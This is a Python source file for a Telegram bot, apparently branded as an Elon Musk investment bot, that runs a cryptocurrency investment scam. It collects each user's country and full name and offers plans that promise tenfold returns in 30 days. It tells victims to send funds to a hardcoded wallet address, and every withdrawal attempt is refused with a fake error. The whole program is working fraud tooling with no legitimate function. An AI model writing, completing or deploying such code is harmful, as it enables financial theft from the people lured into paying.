import telebot
from telebot import types
import pycountry
import json
import os
import flag  # pip install emoji-country-flag
from datetime import datetime
from dotenv import load_dotenv

# --- CONFIGURATION ---
load_dotenv() 
API_TOKEN = os.getenv('API_TOKEN')
ADMIN_ID = 6638267321 

MY_TON_COIN = '0x58Ed91E903BbD23782A166f2434F85114A5e9594'
CHANGELY = 'https://changelly.com/'
DB_FILE = "bot_data.json"

bot = telebot.TeleBot(API_TOKEN)

# --- DATABASE LOGIC ---
def load_data():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"users": {}, "reports": []}
    return {"users": {}, "reports": []}

def save_data(data):
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4)

db = load_data()

def get_user(uid):
    uid = str(uid)
    if uid not in db["users"]:
        db["users"][uid] = {
            "step": "start", "balance": 0.0, "name": "", "country_name": "",
            "pin": None, "linked": False, "investments": [], 
            "blocked": False, "method_type": None
        }
    return db["users"][uid]

def is_valid_country(text):
    user_input = text.strip().upper()
    try:
        code = flag.dflagize(text).replace(":", "")
        if len(code) == 2 and pycountry.countries.get(alpha_2=code.upper()): return True
    except: pass
    if len(user_input) == 2 and pycountry.countries.get(alpha_2=user_input): return True
    user_input_lower = text.strip().lower()
    for c in pycountry.countries:
        if user_input_lower == c.name.lower(): return True
        if hasattr(c, 'common_name') and user_input_lower == c.common_name.lower(): return True
    return False

# --- UI COMPONENTS ---
def show_menu(chat_id, name, edit=False, message_id=None):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("💳 Wallet", callback_data="main_wallet"),
        types.InlineKeyboardButton("📊 Dashboard", callback_data="main_dash"),
        types.InlineKeyboardButton("📉 Analytics", callback_data="main_anal"),
        types.InlineKeyboardButton("❔ Help", callback_data="main_help")
    )
    text = f"Welcome back, **{name}**! 🚀\nManage your investments below."
    if edit and message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="Markdown")
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

# --- COMMANDS ---
@bot.message_handler(commands=['start'])
def start(m):
    u = get_user(m.from_user.id)
    if u["blocked"]: return
    if u["step"] == "completed":
        show_menu(m.chat.id, u["name"])
    else:
        u["step"] = "awaiting_country"
        save_data(db)
        bot.send_message(m.chat.id, "Welcome! 👋\nPlease send your **Country Name**, **Short Code**, or **Flag** to verify.")

# --- TEXT HANDLER ---
@bot.message_handler(func=lambda m: True)
def handle_text(m):
    uid = str(m.from_user.id)
    u = get_user(uid)
    if u["blocked"]: return

    if u["step"] == "awaiting_country":
        if is_valid_country(m.text):
            u["country_name"], u["step"] = m.text, "awaiting_name"
            bot.reply_to(m, "✅ Verified! Now enter your **Full Name**:")
        else: bot.reply_to(m, "❌ Invalid country/flag.")
    
    elif u["step"] == "awaiting_name":
        if len(m.text.split()) >= 2:
            u["name"], u["step"] = m.text, "completed"
            show_menu(m.chat.id, m.text)
        else: bot.reply_to(m, "⚠️ Enter at least 2 words.")

    elif u["step"] == "filing_report":
        db["reports"].append({"id": uid, "msg": m.text, "date": str(datetime.now())})
        u["step"] = "completed"
        bot.send_message(m.chat.id, "✅ Your report has been sent to the admin.")
        bot.send_message(ADMIN_ID, f"🔔 **New Report from {u['name']} ({uid})**:\n{m.text}")
        show_menu(m.chat.id, u["name"])

    save_data(db)

# --- CALLBACK HANDLER ---
@bot.callback_query_handler(func=lambda c: True)
def handle_callbacks(c):
    uid = str(c.from_user.id)
    u = get_user(uid)

    if c.data == "back_main":
        show_menu(c.message.chat.id, u["name"], edit=True, message_id=c.message.message_id)

    elif c.data == "main_wallet":
        markup = types.InlineKeyboardMarkup(row_width=2).add(
            types.InlineKeyboardButton("Withdraw", callback_data="with_check"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
        )
        bot.edit_message_text(f"💳 **Wallet**\n\nBalance: `${u['balance']:,.2f}`", c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif c.data == "main_dash":
        markup = types.InlineKeyboardMarkup(row_width=1).add(
            types.InlineKeyboardButton("$2,000 to get $20,000", callback_data="inv_2000"),
            types.InlineKeyboardButton("$5,000 to get $50,000", callback_data="inv_5000"),
            types.InlineKeyboardButton("$6,000 to get $60,000", callback_data="inv_6000"),
            types.InlineKeyboardButton("$8,000 to get $80,000", callback_data="inv_8000"),
            types.InlineKeyboardButton("$10,000 to get $100,000", callback_data="inv_10000"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
        )
        bot.edit_message_text("📈 **Select Investment Plan**", c.message.chat.id, c.message.message_id, reply_markup=markup)

    elif c.data == "main_anal":
        if not u["investments"]:
            markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("Invest Now", callback_data="main_dash"))
            bot.edit_message_text("📉 **Analytics**\n\nYou have no active investments. Please invest first to see your growth analytics.", c.message.chat.id, c.message.message_id, reply_markup=markup)
        else:
            bot.answer_callback_query(c.id, "Calculating growth...", show_alert=False)

    elif c.data == "main_help":
        markup = types.InlineKeyboardMarkup(row_width=2).add(
            types.InlineKeyboardButton("📩 Report", callback_data="h_report"),
            types.InlineKeyboardButton("📖 Manual", callback_data="h_manual"),
            types.InlineKeyboardButton("⬅️ Back", callback_data="back_main")
        )
        bot.edit_message_text("How can we help you today?", c.message.chat.id, c.message.message_id, reply_markup=markup)

    elif c.data == "h_manual":
        manual_text = ("📖 **User Manual**\n\n"
                       "1. Select a plan from the Dashboard.\n"
                       "2. Fund the provided TON Coin address.\n"
                       "3. Your investment matures 10x in 30 days.\n"
                       "4. Track progress in Analytics.")
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="main_help"))
        bot.edit_message_text(manual_text, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif c.data == "h_report":
        u["step"] = "filing_report"
        save_data(db)
        bot.edit_message_text("Please type your report/complaint below:", c.message.chat.id, c.message.message_id)

    elif c.data.startswith("inv_"):
        amt = c.data.split("_")[1]
        returns = int(amt) * 10
        msg = (f"📥 **Plan: ${amt} to get ${returns:,}**\n\n"
               f"Fund the **TON Coin** address below:\n`{MY_TON_COIN}`\n\n"
               f"Exchange: {CHANGELY}")
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="main_dash"))
        bot.edit_message_text(msg, c.message.chat.id, c.message.message_id, reply_markup=markup, parse_mode="Markdown")

    elif c.data == "with_check":
        bot.answer_callback_query(c.id, "❌ Error: Minimum withdrawal requires active matured investment.", show_alert=True)

    save_data(db)

print("ElonmuskinvestmentBot Online...")
bot.infinity_polling()
